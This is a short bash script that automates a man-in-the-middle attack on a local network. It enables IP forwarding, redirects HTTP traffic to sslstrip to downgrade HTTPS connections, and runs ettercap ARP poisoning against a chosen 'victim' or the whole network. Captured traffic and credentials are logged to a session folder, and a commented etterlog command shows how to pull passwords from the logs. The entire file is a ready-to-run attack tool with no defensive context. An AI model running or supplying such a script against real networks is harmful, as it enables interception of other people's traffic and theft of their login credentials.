#!/bin/bash

echo -n "What interface to use? ie wlan0: "
read -e IFACE
echo -n "Name of "Session"? (name of the folder that will be created with all the log files): "
read -e SESSION
echo -n "Gateway IP - LEAVE BLANK IF YOU WANT TO ARP WHOLE NETWORK: "
read -e ROUTER
echo -n "Target IP - LEAVE BLANK IF YOU WANT TO ARP WHOLE NETWORK: "
read -e VICTIM
mkdir /root/$SESSION/
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward 
sslstrip -p -k -w /root/$SESSION/$SESSION.log & iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
ettercap -T -i $IFACE -w /root/$SESSION/$SESSION.pcap -L /root/$SESSION/$SESSION -M arp /$ROUTER/ /$VICTIM/

killall sslstrip
killall python
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
#etterlog -p -i /root/$SESSION/$SESSION.eci
